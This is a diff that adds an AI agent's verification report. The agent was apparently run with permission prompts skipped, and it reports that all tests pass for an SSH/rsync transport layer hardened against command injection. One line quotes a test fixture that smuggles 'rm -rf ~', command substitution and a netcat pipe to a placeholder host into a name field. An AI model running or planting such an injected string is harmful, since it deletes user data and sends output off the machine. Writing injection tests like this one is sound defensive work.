@@ -1,0 +1,15 @@
+Command: env -u CLAUDECODE claude --dangerously-skip-permissions --model claude-sonnet-4-6 --effort high --exclude-dynamic-system-prompt-sections -p -
+Prompt delivered via: stdin (2938 chars)
+---
+
+**Verdict: PASS**
+
+All 5,367 tests pass, zero regressions. Key findings:
+
+- **SSHBoxRunner** never places request-derived strings in the SSH or rsync argv — they go as JSON to stdin, with `shell=False` on both local subprocess calls.
+- **Injection fixture** (`moody forest; rm -rf ~ && echo $(id) \`whoami\` | nc evil 1 > /tmp/x`) is verified absent from all SSH/rsync args and present verbatim exactly once in the JSON payload.
+- **Remote helper** (`remote_exec.py`) validates JSON strictly (non-empty list-of-strings, NUL rejected) before invoking the renderer with `shell=False`.
+- **All AC-6 startup identity anchors** remain green (37 tests in `test_cli_identity_hardening.py` + `test_first_boot.py`, plus 10 specific nodes); candidate hardening bullets are explicitly out of scope for this transport slice per the spec.
+- One minor note: no compound test for nonzero remote exit + partial transfer — not required by the spec, individual branches are covered.
+
+Report committed at `sdp/verification/t-009@20260530t002730z-verify.md`.
